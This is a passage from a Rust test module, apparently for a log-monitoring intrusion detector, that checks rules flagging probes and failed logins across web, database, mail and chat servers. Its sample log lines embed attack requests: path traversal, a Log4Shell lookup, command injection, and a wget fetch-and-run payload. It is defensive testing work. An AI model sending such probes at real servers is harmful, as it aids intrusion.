                None => Sender { unit: Some(c.unit.clone()), uid: Some("100".into()), ..Default::default() },
            };
            let rec = Record { ts: 1, source: Source::Custom, pid: 1, msg: line.into(), cursor: None, sender: Some(Box::new(sender)) };
            p.feed(&rec, &mut out);
            if !out.is_empty() {
                break;
            }
        }
        out.into_iter().next()
    }

    fn check(app_name: &str, line: &str, want: (Signal, &str, &str)) {
        let e = hit(app_name, line).unwrap_or_else(|| panic!("no event for: {line}"));
        let pattern = e.detail.split(':').next().unwrap_or("").to_string();
        assert_eq!((e.signal, e.ip.to_string().as_str(), pattern.as_str()), want, "{line}");
    }

    fn none(app_name: &str, line: &str) {
        assert!(hit(app_name, line).is_none(), "unexpected event for: {line}");
    }

    use Signal::{CustomFailure as F, CustomProbe as P};

    #[test]
    fn every_rule_compiles_and_validates() {
        let all: Vec<String> = APPS.iter().map(|a| format!("\"{}\"", a.name)).collect();
        let (pats, said) = expand(&sources(&format!("apps = [{}]", all.join(", "))), &Fake(&[], &[])).unwrap();
        assert_eq!(pats.len(), rule_names().count());
        for p in &pats {
            p.validate().unwrap_or_else(|e| panic!("{}: {e:#}", p.name));
        }
        let mut names: Vec<&str> = rule_names().map(|(n, _)| n).collect();
        names.sort();
        names.dedup();
        assert_eq!(names.len(), pats.len(), "names are unique");
        assert!(said.iter().any(|s| s == "PostgreSQL, with %h in log_line_prefix log: journal of postgresql.service"), "{said:?}");
    }

    #[test]
    fn web_servers() {
        let access = r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0""#;
        check("nginx", access, (P, "203.0.113.5", "nginx_probe"));
        check("apache", access, (P, "203.0.113.5", "apache_probe"));
        for target in [
            "/app/.git/config",
            "/../../etc/passwd",
            "/cgi-bin/.%2e/.%2e/bin/sh",
            "/?x=${jndi:ldap://x}",
            "/.env.bak",
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/HNAP1/",
        ] {
            check(
                "nginx",
                &format!(r#"2001:db8::7 - - [25/Oct/2026:10:00:00 +0000] "POST {target} HTTP/1.1" 404 0 "-" "x""#),
                (P, "2001:db8::7", "nginx_probe"),
            );
        }
        // Apache's vhost_combined, and IPv6 after it
        check(
            "apache",
            r#"example.org:443 2001:db8::9 - - [25/Oct/2026:10:00:00 +0000] "GET /.git/HEAD HTTP/1.1" 404 196"#,
            (P, "2001:db8::9", "apache_probe"),
        );
        // the honeypots' (Honeynet Project, 2004 and 2005): IIS worms, FrontPage, open proxy
        for target in [
            "/scripts/root.exe?/c+dir",
            "/c/winnt/system32/cmd.exe?/c+dir",
            "/default.ida?XXXXXXXX%u9090",
            "/_vti_bin/_vti_aut/fp30reg.dll",
            "//cgi-bin/awstats.pl?configdir=|%20id%20|",
        ] {
            check(
                "apache",
                &format!(r#"11.27.50.137 - - [28/Aug/2005:06:22:08 -0400] "GET {target} HTTP/1.0" 404 290 "-" "-""#),
                (P, "11.27.50.137", "apache_probe"),
            );
        }
        check(
            "apache",
            r#"11.6.47.203 - - [28/Aug/2005:05:07:44 -0400] "GET http://www.yahoo.com/ HTTP/1.1" 403 3931 "-" "x""#,
            (P, "11.6.47.203", "apache_proxy"),
        );
        check(
            "nginx",
            r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "CONNECT www.example.com:443 HTTP/1.1" 400 150 "-" "-""#,
            (P, "203.0.113.5", "nginx_proxy"),
        );
        check(
            "nginx",
            r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET /shell?cd+/tmp;wget+http://198.51.100.1/x.sh HTTP/1.1" 404 150 "-" "-""#,
            (P, "203.0.113.5", "nginx_probe"),
        );
        check(
            "apache",
            "[Wed Jun 22 03:50:22 2005] [error] [client 11.55.38.17] Invalid method in request get /scripts/root.exe?/c+dir",
            (P, "11.55.38.17", "apache_badreq"),
        );
        check(
            "apache",
            "[Mon Aug 29 06:27:40 2005] [error] [client 11.53.22.150] request failed: URI too long (longer than 8190)",
            (P, "11.53.22.150", "apache_badreq"),
        );
        // scanners by their user agent (trumb/nginx-hardening's list, the attack tools and
        // survey scanners of it)
        check(
            "nginx",
            r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)""#,
            (P, "203.0.113.5", "nginx_scanner"),
        );
        check(
            "apache",
            r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET /index.php HTTP/1.1" 404 196 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)""#,
            (P, "203.0.113.5", "apache_scanner"),
        );
        check(
            "nginx",
            r#"203.0.113.6 - - [25/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)""#,
            (P, "203.0.113.6", "nginx_survey"),
        );
        check(
            "nginx",
            r#"203.0.113.7 - - [25/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 612 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space""#,
            (P, "203.0.113.7", "nginx_survey"),
        );
        // a tool's name in the path or the referer, apps' HTTP libraries, a word holding "odin"
        none(
            "nginx",
            r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET /blog/nmap-tutorial HTTP/1.1" 200 612 "https://x/nikto" "Mozilla/5.0 (X11; Linux x86_64) Firefox/140.0""#,
        );
        none("nginx", r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "PUT /upload/x.jpg HTTP/1.1" 201 0 "-" "okhttp/4.12.0""#);
        none("nginx", r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "Encoding-Test/1.0""#);
        // a link to another site in a query: not a proxy request
        none("nginx", r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET /login?next=https://example.org/ HTTP/1.1" 302 0 "-" "x""#);
        // ordinary requests, WordPress, an .envoy page
        none("nginx", r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET /wp-login.php HTTP/1.1" 200 4000 "-" "x""#);
        none("nginx", r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET /docs/.envoy HTTP/1.1" 200 4000 "-" "x""#);
        // a referer or user agent naming a probe doesn't make the request one
        none("nginx", r#"203.0.113.5 - - [25/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1 "https://x/.env" "/.git/""#);
        // a Basic user name with spaces doesn't hide a probe
        check(
            "nginx",
            r#"203.0.113.5 - a b [25/Oct/2026:10:00:00 +0000] "GET /.env HTTP/1.1" 401 1 "-" "x""#,
            (P, "203.0.113.5", "nginx_probe"),
        );

        let ngx = |msg: &str| {
            format!(
                "2026/10/25 10:00:00 [error] 1234#1234: *5 {msg}, server: example.org, request: \"GET / HTTP/1.1\", host: \"example.org\""
            )
        };
        check("nginx", &ngx("user \"alice\": password mismatch, client: 203.0.113.5"), (F, "203.0.113.5", "nginx_auth"));
        check(
            "nginx",
            &ngx("user \"bob\" was not found in \"/etc/nginx/.htpasswd\", client: 2001:db8::1"),
            (F, "2001:db8::1", "nginx_auth"),
        );
        check("nginx", &ngx("access forbidden by rule, client: 203.0.113.6"), (P, "203.0.113.6", "nginx_denied"));
        check("nginx", &ngx("limiting requests, excess: 10.500 by zone \"one\", client: 203.0.113.7"), (P, "203.0.113.7", "nginx_limit"));
        check("nginx", &ngx("limiting connections by zone \"addr\", client: 203.0.113.8"), (P, "203.0.113.8", "nginx_limit"));
        none("nginx", &ngx("no user/password was provided for basic authentication, client: 203.0.113.5"));
        // a user name naming another address: the account, not the address
        let e = hit(
            "nginx",
            &ngx("user \"x\" was not found in \"y\", client 198.51.100.1\" was not found in \"/etc/nginx/.htpasswd\", client: 203.0.113.5"),
        )
        .unwrap();
        assert_eq!(e.ip.to_string(), "203.0.113.5");
        let e = hit("nginx", &ngx(r#"user "x", client 198.51.100.1, y": password mismatch, client: 203.0.113.5"#)).unwrap();
        assert_eq!(e.ip.to_string(), "203.0.113.5");

        let ap = |module: &str, msg: &str| {
            format!("[Sun Oct 25 10:00:00.123456 2026] [{module}] [pid 1234:tid 5678] [client 203.0.113.5:51234] {msg}")
        };
        check(
            "apache",
            &ap("auth_basic:error", "AH01617: user alice: authentication failure for \"/private\": Password Mismatch"),
            (F, "203.0.113.5", "apache_auth"),
        );
        check("apache", &ap("auth_basic:error", "AH01618: user bob not found: /private"), (F, "203.0.113.5", "apache_auth"));
        check("apache", &ap("core:error", "AH10244: invalid URI path (/cgi-bin/.%2e/.%2e/bin/sh)"), (P, "203.0.113.5", "apache_traversal"));
        check(
            "apache",
            &ap("authz_core:error", "AH01630: client denied by server configuration: /var/www/html/.git"),
            (P, "203.0.113.5", "apache_denied"),
        );
        check(
            "apache",
            "[Sun Oct 25 10:00:00 2026] [auth_basic:error] [pid 99] [client 2001:db8::5:59540] AH01618: user x not found: /",
            (F, "2001:db8::5", "apache_auth"),
        );
        // the Apache documentation's line (no port), and Apache 2.2's format (loghub's sample)
        check("apache", "[Fri Sep 09 10:42:29.902022 2011] [authz_core:error] [pid 35708:tid 4328636416] [client 11.28.35.187] AH01630: client denied by server configuration: /srv/.git", (P, "11.28.35.187", "apache_denied"));
        check(
            "apache",
            "[Sun Dec 04 04:51:18 2005] [error] [client 11.34.21.119] user admin not found: /admin",
            (F, "11.34.21.119", "apache_auth"),
        );
        check("apache", "[Sun Dec 04 04:51:18 2005] [error] [client ::ffff:11.34.21.119] client denied by server configuration: /var/www/html/.htpasswd", (P, "11.34.21.119", "apache_denied"));
        none("apache", "[Sun Dec 04 04:51:18 2005] [error] [client 11.34.21.119] Directory index forbidden by rule: /var/www/html/");
        none("apache", "[Sun Dec 04 04:47:44 2005] [error] mod_jk child workerEnv in error state 6");
        none("apache", &ap("core:error", "AH00128: File does not exist: /var/www/html/favicon.ico"));
        let e = hit("apache", &ap("auth_basic:error", "AH01618: user x [client 198.51.100.1] not found: /")).unwrap();
        assert_eq!(e.ip.to_string(), "203.0.113.5");
    }

    #[test]
    fn haproxy() {
        let http = |client: &str, status: &str, term: &str, req: &str| {
            format!("{client} [25/Oct/2026:10:00:00.123] fe_https~ be_app/srv1 0/0/1/2/3 {status} 123 - - {term} 1/1/0/0/0 0/0 {{x.example}} \"{req}\"")
        };
        check("haproxy", &http("203.0.113.5:51234", "404", "----", "GET /.env HTTP/1.1"), (P, "203.0.113.5", "haproxy_probe"));
        check("haproxy", &http("2001:db8::1:51234", "403", "PR--", "GET /admin HTTP/1.1"), (P, "2001:db8::1", "haproxy_denied"));
        check("haproxy", &http("203.0.113.5:51234", "400", "PR--", "<BADREQ>"), (P, "203.0.113.5", "haproxy_denied"));
        none("haproxy", &http("203.0.113.5:51234", "200", "----", "GET / HTTP/1.1"));
        none("haproxy", &http("203.0.113.5:51234", "503", "SC--", "GET / HTTP/1.1"));
        // as rsyslog writes it to /var/log/haproxy.log
        check(
            "haproxy",
            &format!(
                "2026-10-25T10:00:00.123456+00:00 lb haproxy[1234]: {}",
                http("203.0.113.5:51234", "404", "----", "GET /.git/config HTTP/1.1")
            ),
            (P, "203.0.113.5", "haproxy_probe"),
        );
        check(
            "haproxy",
            "Oct  5 10:00:00 lb haproxy[1234]: 203.0.113.9:40000 [05/Oct/2026:10:00:00.001] fe_https/1: SSL handshake failure",
            (P, "203.0.113.9", "haproxy_tls"),
        );
        // a request naming another address in the place of the client
        none(
            "haproxy",
            &http(
                "203.0.113.5:51234",
                "200",
                "----",
                "GET /x]: 198.51.100.1:1 [25/Oct/2026:10:00:00.000] fe/1: SSL handshake failure HTTP/1.1",
            ),
        );
    }

    #[test]
    fn prosody() {
        let line =
            "Oct 25 10:00:00 c2s55d0a1b2c3d0\tinfo\tFailed authentication attempt (not-authorized) for user alice from IP: 203.0.113.5";
        check("prosody", line, (F, "203.0.113.5", "prosody_auth"));
        check(
            "prosody",
            "c2s55d0a1b2c3d0: Failed authentication attempt (not-authorized) for user bob from IP: ::ffff:203.0.113.6",
            (F, "203.0.113.6", "prosody_auth"),
        );
        // only the address at the end counts
        none("prosody", "c2s1 info Failed authentication attempt (not-authorized) for user x from IP: 198.51.100.1 y");
        let e = hit("prosody", "c2s1 info Failed authentication attempt (not-authorized) for user Failed authentication attempt (x) for user y from IP: 198.51.100.1 from IP: 203.0.113.5");
        assert!(e.is_none_or(|e| e.ip.to_string() == "203.0.113.5"));
        assert_eq!(hit("prosody", line).unwrap().account.as_deref(), Some("prosody_auth:alice"));
        // the console's padded source and level (Prosody under systemd, in the journal)
        check(
            "prosody",
            "c2s55d0a1b2c3d0                  info\tFailed authentication attempt (not-authorized) for user carol from IP: 203.0.113.7",
            (F, "203.0.113.7", "prosody_auth"),
        );
        // a client's text at the end of another message (a stream error it sent) isn't one
        none(
            "prosody",
            "Oct 25 10:00:00 c2s55d0a1b2c3d0\tinfo\tSession closed by remote with error: undefined-condition (Failed authentication attempt (x) for user y from IP: 198.51.100.1",
        );
        none("prosody", "c2s55d0a1b2c3d0: Client disconnected: Failed authentication attempt (x) for user y from IP: 198.51.100.1");
    }

    #[test]
    fn databases() {
        // MariaDB, MySQL 8, MySQL 5.7
        check(
            "mysql",
            "2026-10-25 10:00:00 12 [Warning] Access denied for user 'root'@'203.0.113.5' (using password: YES)",
            (F, "203.0.113.5", "mysql_auth"),
        );
        check(
            "mysql",
            "2026-10-25T10:00:00.123456Z 12 [Note] [MY-010926] [Server] Access denied for user 'admin'@'2001:db8::1' (using password: NO)",
            (F, "2001:db8::1", "mysql_auth"),
        );
        check(
            "mysql",
            "2026-10-25T10:00:00.123456Z 7 [Note] Access denied for user 'x'@'203.0.113.6' (using password: YES)",
            (F, "203.0.113.6", "mysql_auth"),
        );
        check(
            "mysql",
            "2026-10-25 10:00:01 13 [Warning] Aborted connection 13 to db: 'unconnected' user: 'unauthenticated' host: '203.0.113.7' (This connection closed normally without authentication)",
            (P, "203.0.113.7", "mysql_preauth"),
        );
        // a host name instead of an address (skip_name_resolve off): no event
        none("mysql", "2026-10-25 10:00:00 12 [Warning] Access denied for user 'root'@'scanner.example' (using password: YES)");
        // user names naming another address: the server's, last, counts
        let e = hit("mysql", "2026-10-25 10:00:00 12 [Warning] Access denied for user 'x'@'198.51.100.1' (using password: YES)'@'203.0.113.5' (using password: YES)").unwrap();
        assert_eq!(e.ip.to_string(), "203.0.113.5");
        let e = hit(
            "mysql",
            "2026-10-25 10:00:00 12 [Warning] Access denied for user 'Aborted connection 1 to db: 'unconnected' user: 'unauthenticated' host: '198.51.100.1' ('@'203.0.113.5' (using password: YES)",
        )
        .unwrap();
        assert_eq!((e.ip.to_string().as_str(), e.signal), ("203.0.113.5", F));

        let pg = |msg: &str| format!("2026-10-25 10:00:00.123 UTC [12345] 203.0.113.5 postgres@postgres {msg}");
        check("postgresql", &pg("FATAL:  password authentication failed for user \"postgres\""), (F, "203.0.113.5", "postgresql_auth"));
        check("postgresql", &pg("FATAL:  role \"admin\" does not exist"), (F, "203.0.113.5", "postgresql_role"));
        check(
            "postgresql",
            &pg("FATAL:  no pg_hba.conf entry for host \"203.0.113.5\", user \"x\", database \"y\", no encryption"),
            (P, "203.0.113.5", "postgresql_hba"),
        );
        check(
            "postgresql",
            "2026-10-25 10:00:00 CET [99] 2001:db8::1(51234) LOG:  invalid length of startup packet",
            (P, "2001:db8::1", "postgresql_preauth"),
        );
        none("postgresql", &pg("LOG:  connection authorized: user=app database=app"));
        // the default prefix (no %h): nothing to go by
        none(
            "postgresql",
            "2026-10-25 10:00:00.123 UTC [12345] postgres@postgres FATAL:  password authentication failed for user \"postgres\"",
        );
        none("postgresql", "2026-10-25 10:00:00.123 UTC [12345] cafe@db FATAL:  password authentication failed for user \"cafe\"");
        // local connections
        none(
            "postgresql",
            "2026-10-25 10:00:00.123 UTC [12345] [local] postgres@postgres FATAL:  password authentication failed for user \"postgres\"",
        );
        // a continuation line PostgreSQL wrote for a user name with a line break starts with a tab
        none("postgresql", "\t2026-10-25 10:00:00.123 UTC [1] 198.51.100.1 x@y FATAL:  password authentication failed for user \"x\"");

        check(
            "mongodb",
            r#"{"t":{"$date":"2026-10-25T10:00:00.123+00:00"},"s":"I",  "c":"ACCESS",   "id":20249,   "ctx":"conn12","msg":"Authentication failed","attr":{"mechanism":"SCRAM-SHA-256","speculative":false,"principalName":"admin","authenticationDatabase":"admin","remote":"203.0.113.5:51234","extraInfo":{},"error":"UserNotFound: Could not find user \"admin\" for db \"admin\""}}"#,
            (F, "203.0.113.5", "mongodb_auth"),
        );
        check(
            "mongodb",
            r#"{"t":{"$date":"2026-10-25T10:00:00.123+00:00"},"s":"I",  "c":"ACCESS",   "id":5286307, "ctx":"conn5","msg":"Failed to authenticate","attr":{"client":"[2001:db8::1]:50000","isSpeculative":false,"isClusterMember":false,"mechanism":"SCRAM-SHA-256","user":"root","db":"admin","error":"AuthenticationFailed: SCRAM authentication failed, storedKey mismatch","result":18}}"#,
            (F, "2001:db8::1", "mongodb_auth_v6"),
        );
        // a user name holding a "remote": it is escaped in JSON
        let e = hit(
            "mongodb",
            r#"{"t":{"$date":"2026-10-25T10:00:00.123+00:00"},"s":"I","c":"ACCESS","id":20249,"ctx":"conn12","msg":"Authentication failed","attr":{"mechanism":"SCRAM-SHA-256","speculative":false,"principalName":"x\",\"remote\":\"198.51.100.1:1\"","authenticationDatabase":"admin","remote":"203.0.113.5:51234"}}"#,
        )
        .unwrap();
        assert_eq!(
            (e.ip.to_string().as_str(), e.account.as_deref()),
            ("203.0.113.5", Some(r#"mongodb_auth:x\",\"remote\":\"198.51.100.1:1\""#))
        );
        none(
            "mongodb",
            r#"{"t":{"$date":"2026-10-25T10:00:00.123+00:00"},"s":"I","c":"NETWORK","id":22943,"ctx":"listener","msg":"Connection accepted","attr":{"remote":"203.0.113.5:51234"}}"#,
        );
    }

    #[test]
    fn nextcloud_and_owncloud() {
        // a real line from the server (Nextcloud 34.0.4)
        let real = r#"{"reqId":"WVnDVHYg2lFh0z5kmXVC","level":2,"time":"2026-10-11T19:54:01+00:00","remoteAddr":"11.32.37.110","user":"--","app":"no app in context","method":"POST","url":"/login","scriptName":"/index.php","message":"Login failed: admin (Remote IP: 11.32.37.110)","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0","version":"11.9.4.1","data":[]}"#;
        check("nextcloud", real, (F, "11.32.37.110", "nextcloud_auth"));
        assert_eq!(hit("nextcloud", real).unwrap().account.as_deref(), Some("nextcloud_auth:admin"));
        check(
            "nextcloud",
            r#"{"reqId":"a","level":1,"time":"2026-10-26T10:00:00+00:00","remoteAddr":"2001:db8::7","user":"--","app":"core","method":"POST","url":"/login","message":"Bruteforce attempt from \"2001:db8::7\" detected for action \"login\".","userAgent":"curl"}"#,
            (P, "2001:db8::7", "nextcloud_bruteforce"),
        );
        // ownCloud 10 quotes the name and the address
        let oc = r#"{"reqId":"YbQx","level":2,"time":"2026-10-26T10:00:00+00:00","remoteAddr":"203.0.113.5","user":"--","app":"core","method":"POST","url":"/login?user=admin","message":"Login failed: 'admin' (Remote IP: '203.0.113.5')"}"#;
        check("owncloud", oc, (F, "203.0.113.5", "owncloud_auth"));
        assert_eq!(hit("owncloud", oc).unwrap().account.as_deref(), Some("owncloud_auth:'admin'"));
        // a user name or URL naming another address: escaped in JSON, the line's own counts
        let forged = r#"{"reqId":"b","level":2,"time":"2026-10-26T10:00:00+00:00","remoteAddr":"203.0.113.6","user":"--","app":"core","method":"POST","url":"/login?\"remoteAddr\":\"198.51.100.1\"","message":"Login failed: x\",\"remoteAddr\":\"198.51.100.1 (Remote IP: 198.51.100.1)"}"#;
        check("nextcloud", forged, (F, "203.0.113.6", "nextcloud_auth"));
        // the updater's line (no address), other messages, the AIO Apache's lines
        none(
            "nextcloud",
            r#"{"reqId":"K2G5","level":1,"time":"2026-09-06T15:23:53+00:00","remoteAddr":"","user":"--","app":"updater","method":"","url":"--","message":"\OC\Updater::updateEnd: Update successful"}"#,
        );
        none(
            "nextcloud",
            r#"{"reqId":"c","level":2,"time":"2026-10-26T10:00:00+00:00","remoteAddr":"203.0.113.5","user":"alice","app":"core","method":"GET","url":"/","message":"Trusted domain error. \"203.0.113.5\" tried to access using \"x\" as host."}"#,
        );
        none("nextcloud", "[Mon Oct 05 06:48:49 2026] [error] [client: 11.10.32.142] [AH01797: client denied by server configuration: /var/www/html/config/aws.yml]");

        // the snap: its log and its Apache's
        let host = Fake(&["/var/snap/nextcloud/current/logs/nextcloud.log", "/var/snap/nextcloud/current/logs/apache_errors.log"], &[]);
        let (pats, _) = expand(&sources("apps = [\"nextcloud\", \"apache\"]"), &host).unwrap();
        let file = |n: &str| pats.iter().find(|p| p.name == n).and_then(|p| p.file.clone()).unwrap();
        assert_eq!(file("nextcloud_auth"), PathBuf::from("/var/snap/nextcloud/current/logs/nextcloud.log"));
        assert_eq!(file("apache_auth"), PathBuf::from("/var/snap/nextcloud/current/logs/apache_errors.log"));
        // with AIO's source too, every failed login would count twice
        let both = expand(&sources("nextcloud_aio = true\napps = [\"nextcloud\"]"), &host).unwrap_err().to_string();
        assert!(both.contains("keep one"), "{both}");
        let old_name = expand(&sources("nextcloud = true\napps = [\"nextcloud\"]"), &host).unwrap_err().to_string();
        assert!(old_name.contains("keep one"), "the old name means the same: {old_name}");
        expand(&sources("nextcloud_aio = true\napps = [\"owncloud\"]"), &host).unwrap();
    }

    #[test]
    fn in_memory_stores() {
        check(
            "redis",
            "1234:M 25 Oct 2026 10:00:00.123 # Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection from 203.0.113.5:51234 aborted.",
            (P, "203.0.113.5", "redis_attack"),
        );
        check(
            "redis",
            "1234:M 25 Oct 2026 10:00:00.123 # Error accepting a client connection: error:0A00010B:SSL routines::wrong version number (addr=203.0.113.6:40000 laddr=10.0.0.1:6379)",
            (P, "203.0.113.6", "redis_tls"),
        );
        none("redis", "1234:M 25 Oct 2026 10:00:00.123 * Ready to accept connections tcp");
        // without an address (older versions): nothing
        none("redis", "1234:M 25 Oct 2026 10:00:00.123 # Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. Connection aborted.");
    }

    #[test]
    fn web_console() {
        check("logguard-web", "login failed from 203.0.113.5: wrong password", (F, "203.0.113.5", "logguard_web_login"));
        check("logguard-web", "login failed from 203.0.113.5: wrong code (account alice)", (F, "203.0.113.5", "logguard_web_login"));
        check(
            "logguard-web",
            "login failed from 203.0.113.5: wrong password (an unknown account)",
            (F, "203.0.113.5", "logguard_web_login"),
        );
        check(
            "logguard-web",
            "login refused from 2001:db8::5: locked out for 899s more after 5 failures",
            (F, "2001:db8::5", "logguard_web_login"),
        );
        check("logguard-web", "console: unknown path from 203.0.113.6: GET /.env", (P, "203.0.113.6", "logguard_web_probe"));
        check("logguard-web", "console: unknown path from 203.0.113.6: POST /x/../../etc/passwd", (P, "203.0.113.6", "logguard_web_probe"));
        check("logguard-web", "agent: refused connection from 203.0.113.7: not in AGENT_ALLOW", (P, "203.0.113.7", "logguard_web_refused"));
        check(
            "logguard-web",
            "console: refused connection from 203.0.113.8: not in CONSOLE_ALLOW",
            (P, "203.0.113.8", "logguard_web_refused"),
        );
        check(
            "logguard-web",
            "agent: rejected request from 203.0.113.9: authentication failed (another web key, or not a console)",
            (P, "203.0.113.9", "logguard_web_agent"),
        );
        // the admin's own login, other paths, the console's other lines
        none("logguard-web", "login from 203.0.113.5");
        none("logguard-web", "console: unknown path from 203.0.113.6: GET /favicon.ico");
        none("logguard-web", "console: TLS handshake with 203.0.113.6 failed: peer is incompatible");
        none("logguard-web", "logguard-web 0.1.0 started: console on https://0.0.0.0:7948 (3 nodes)");
        // a path (no blanks: the console refuses them) can't name another address: it comes after
        // the client's own, escaped onto the same line
        none("logguard-web", "console: unknown path from 203.0.113.6: GET /\\nlogin failed from 198.51.100.1: x");
        check(
            "logguard-web",
            "console: unknown path from 203.0.113.6: GET /x?q=login%20failed%20from%20198.51.100.1:/.git/config",
            (P, "203.0.113.6", "logguard_web_probe"),
        );
    }

    #[test]
    fn mail() {
        check(
            "postfix",
            "warning: unknown[203.0.113.5]: SASL LOGIN authentication failed: UGFzc3dvcmQ6, sasl_username=alice@example.org",
            (F, "203.0.113.5", "postfix_sasl"),
        );
        check(
            "postfix",
            "Oct 25 10:00:00 mx postfix/submission/smtpd[11]: warning: host.example[2001:db8::1]: SASL PLAIN authentication failed: authentication failure",
            (F, "2001:db8::1", "postfix_sasl"),
        );
        check(
            "postfix",
            "NOQUEUE: reject: RCPT from unknown[203.0.113.6]: 554 5.7.1 <x@example.com>: Relay access denied; from=<a@b> to=<x@example.com> proto=ESMTP helo=<x>",
            (P, "203.0.113.6", "postfix_relay"),
        );
        none("postfix", "connect from unknown[203.0.113.5]");
        none("postfix", "NOQUEUE: reject: RCPT from mail.example[203.0.113.7]: 550 5.1.1 <nobody@example.org>: Recipient address rejected: User unknown in local recipient table");

        let dv = "imap-login: Disconnected: Connection closed (auth failed, 3 attempts in 15 secs): user=<alice>, method=PLAIN, rip=203.0.113.5, lip=10.0.0.1, TLS, session=<abc>";
        check("dovecot", dv, (F, "203.0.113.5", "dovecot_auth"));
        check(
            "dovecot",
            "Oct 25 10:00:00 mx dovecot[99]: pop3-login: Login aborted: Connection closed (auth failed, 1 attempts in 2 secs) (auth_failed): user=<bob>, method=PLAIN, rip=2001:db8::1, lip=2001:db8::2, session=<x>",
            (F, "2001:db8::1", "dovecot_auth"),
        );
        none("dovecot", "imap-login: Login: user=<alice>, method=PLAIN, rip=203.0.113.5, lip=10.0.0.1, mpid=1, TLS, session=<abc>");
        let e = hit(
            "dovecot",
            "imap-login: Disconnected (auth failed, 1 attempts in 2 secs): user=<x>, method=PLAIN, rip=198.51.100.1, lip=1: user=<y>, method=PLAIN, rip=203.0.113.5, lip=10.0.0.1, session=<abc>",
        )
        .unwrap();
        assert_eq!(e.ip.to_string(), "203.0.113.5");
    }

    #[test]
    fn where_the_logs_are() {
        let host = Fake(
            &["/var/log/nginx/access.log", "/var/log/nginx/shop.example-access.log", "/var/log/nginx/error.log", "/var/log/mail.log"],
            &["postfix@-.service", "mariadb.service"],
        );
        let (pats, said) = expand(&sources("apps = [\"nginx\", \"postfix\", \"mysql\", \"redis\"]"), &host).unwrap();
        let probe = pats.iter().find(|p| p.name == "nginx_probe").unwrap();
        assert_eq!(probe.file.as_deref(), Some(Path::new("/var/log/nginx/access.log")));
        assert_eq!(probe.extra_files, vec![PathBuf::from("/var/log/nginx/shop.example-access.log")], "every access log");
        // mail.log exists, but syslog files are forgeable: Postfix's journal
        assert_eq!(pats.iter().find(|p| p.name == "postfix_sasl").unwrap().unit, "postfix@-.service");
        // no MySQL file: the installed unit's journal
        assert_eq!(pats.iter().find(|p| p.name == "mysql_auth").unwrap().unit, "mariadb.service");
        // nothing installed: the first unit
        assert_eq!(pats.iter().find(|p| p.name == "redis_attack").unwrap().unit, "redis-server.service");
        assert!(
            said.contains(&"nginx access log: /var/log/nginx/access.log, /var/log/nginx/shop.example-access.log".to_string()),
            "{said:?}"
        );

        let (pats, _) = expand(
            &sources(
                "apps = [\"nginx\", \"postgresql\"]\n[app_logs]\nnginx_access = [\"/srv/a.log\", \"/srv/b.log\"]\npostgresql = \"postgresql@17-main.service\"\n[app_weights]\nnginx_limit = 0",
            ),
            &host,
        )
        .unwrap();
        let probe = pats.iter().find(|p| p.name == "nginx_probe").unwrap();
        assert_eq!((probe.file.as_deref(), probe.extra_files.len()), (Some(Path::new("/srv/a.log")), 1), "files that aren't there yet");
        assert_eq!(pats.iter().find(|p| p.name == "postgresql_auth").unwrap().unit, "postgresql@17-main.service");
        assert_eq!(pats.iter().find(|p| p.name == "nginx_limit").unwrap().weight, 0.0);

        let err = |toml: &str| expand(&sources(toml), &host).unwrap_err().to_string();
        assert!(err("apps = [\"lighttpd\"]").contains("built in: apache, nginx"));
        assert!(err("apps = [\"nginx\", \"nginx\"]").contains("twice"));
        assert!(err("apps = [\"nginx\"]\n[app_logs]\nmysql = \"mysql.service\"").contains("isn't in [sources] apps"));
        assert!(err("apps = [\"nginx\"]\n[app_logs]\nnginx = \"/x\"").contains("unknown log 'nginx'"));
        assert!(err("apps = [\"nginx\"]\n[app_logs]\nnginx_error = \"error.log\"").contains("neither an absolute path"));
        assert!(err("apps = [\"nginx\"]\n[app_logs]\nnginx_error = [\"/a\", \"b.service\"]").contains("absolute"));
        assert!(err("apps = [\"nginx\"]\n[app_logs]\nnginx_error = \"/srv/*/error.log\"").contains("only in the file name"));
        assert!(err("apps = [\"nginx\"]\n[app_logs]\nnginx_error = \"/srv/*.log\"").contains("no file matches"));
        assert!(err("apps = [\"nginx\"]\n[app_weights]\nnginx_x = 1").contains("unknown built-in pattern"));
        assert!(err("apps = [\"nginx\"]\n[app_weights]\nmysql_auth = 1").contains("isn't in [sources] apps"));
        assert!(err("apps = [\"nginx\"]\n[app_weights]\nnginx_auth = -1").contains("within 0 and 1000"));
    }

    #[test]
    fn system_host_lists_files() {
        let dir = std::env::temp_dir().join(format!("logguard-apps-{}", std::process::id()));
        std::fs::create_dir_all(dir.join("sub-access.log")).unwrap();
        for f in ["access.log", "shop-access.log", "error.log"] {
            std::fs::write(dir.join(f), "").unwrap();
        }
        let d = dir.display();
        let found = System.files(&format!("{d}/*access.log"));
        assert_eq!(found, vec![dir.join("access.log"), dir.join("shop-access.log")], "files only, sorted");
